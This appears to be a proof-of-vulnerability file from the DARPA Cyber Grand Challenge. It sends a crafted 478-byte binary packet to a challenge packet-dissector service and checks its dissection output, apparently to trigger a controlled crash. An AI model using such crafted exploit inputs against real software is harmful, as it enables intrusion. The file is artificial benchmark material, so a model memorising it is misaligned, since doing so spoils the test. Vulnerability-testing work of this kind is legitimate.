#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xde\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xc6\x01\x00\x00\xbe\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xbe\x01\x00\x00"
         "\xfb\x7b\x15\xa0\x8d\xa7\xc7\x49\x54\x3c\xea\xb6\xa7\xeb\xfa\x4a"
         "\x62\x63\x8f\xeb\x27\x00\x00\x00\x01\xfb\x3d\x12\xb0\x50\x2c\xea"
         "\xcc\x4e\xb2\xf1\x20\x17\x36\x52\x61\x97\x41\x00\x22\x7c\xc9\x68"
         "\x41\x00\x09\x0d\x01\x08\x53\xbf\x7f\x87\x97\x7b\xae\xad\x9a\x01"
         "\xa3\x69\x01\x00\xb4\xd0\xa6\x5c\x18\x06\x68\x83\x87\x12\xc8\x64"
         "\x12\xd9\x6c\x77\x75\x2d\x73\xf5\x42\x24\x86\x1b\xbc\xa6\x9a\x01"
         "\x72\x29\xe3\xe5\xda\xa4\xcf\x27\xed\xac\x35\xc5\x41\x5d\xbc\x9e"
         "\x39\xc0\x1a\x82\xee\xc8\x37\x4b\x4d\x78\x6c\x01\x00\xe8\xf7\x17"
         "\x22\x31\x02\xd9\xcc\xde\xf0\x2d\xbf\x77\x01\x04\x41\x00\x01\x00"
         "\xe3\x01\x00\x6e\xd8\xd2\x9c\xc4\x2e\x09\xef\x71\xb0\x2e\x0d\xbe"
         "\xf1\xff\xdb\x64\xcc\x19\x18\x48\x69\x45\xff\xd9\xdd\xee\xba\x6b"
         "\x80\x3d\x63\xb6\x45\xee\x26\xdc\xfc\xe9\xd5\x2d\xb0\x72\x8c\x28"
         "\x6a\xf8\xbc\x35\xef\x8b\x4e\x8c\xa2\x01\xd7\x03\x6b\x3a\xbb\xf8"
         "\x3b\xc2\x2d\xe0\x78\x95\x67\x0c\x65\x74\x19\x7e\x0e\xca\x75\xbd"
         "\x74\xc8\xea\x31\x5b\xb2\x09\xa5\x54\x9a\xa8\x64\x4e\x1f\x07\x52"
         "\xb9\x26\x55\xa6\xc8\x98\x96\x48\x25\x2e\x66\xae\xc4\xb0\xc0\x60"
         "\x3a\xca\x86\x29\x16\x0e\x83\x1a\xf9\x6e\x8b\x03\x0e\x6f\xa2\x6c"
         "\x00\xc6\x77\xb8\xfe\xe2\x02\xbe\x79\xfb\xac\x91\xbc\x4d\x48\x26"
         "\xf5\x8f\x79\xac\x47\x58\xe0\x62\x59\x5e\xd7\x8c\x32\x5f\x14\x27"
         "\x1d\xb3\xd0\x12\x7f\xfd\x53\xac\x15\x68\x4a\xa4\xad\x31\x51\x59"
         "\xdb\x1d\xef\x95\x50\x2c\x04\x82\x1b\xd9\xa1\x3c\x78\x0b\x31\xc1"
         "\xe0\x10\x15\xb7\x44\x93\xd9\x7f\xb4\xf2\xe1\xe7\x14\x79\x41\xda"
         "\xad\xc5\x78\x67\xdd\x70\xb3\x27\x53\x15\x4c\x33\xc6\x71\xc6\xec"
         "\x1a\x8b\xf7\xa2\xa8\x93\x58\xa5\x65\x86\x9e\x96\x45\x32\x58\x78"
         "\x4e\x8f\x52\x10\x4b\x8c\x07\x07\x5e\xa2\x4c\xc8\x1a\x3f\x49\x3d"
         "\x44\xff\x84\x7c\x5c\xcf\x10\xd6\xc8\x24\x86\x44\x06\xf6\xe5\x46"
         "\x3e\xe6\x53\xb9\xe9\xf9\x27\x45\xcd\x21\x01\x00\x5a\x75\x41\x00"
         "\x41\x00\x14\x90\xc6\xb6\x41\x00\x01\x00\x1c\x01\x00\x1a";
      static unsigned int write_00001_00000_len = 478;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamadecoke
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x64\x65\x63\x6f\x6b\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
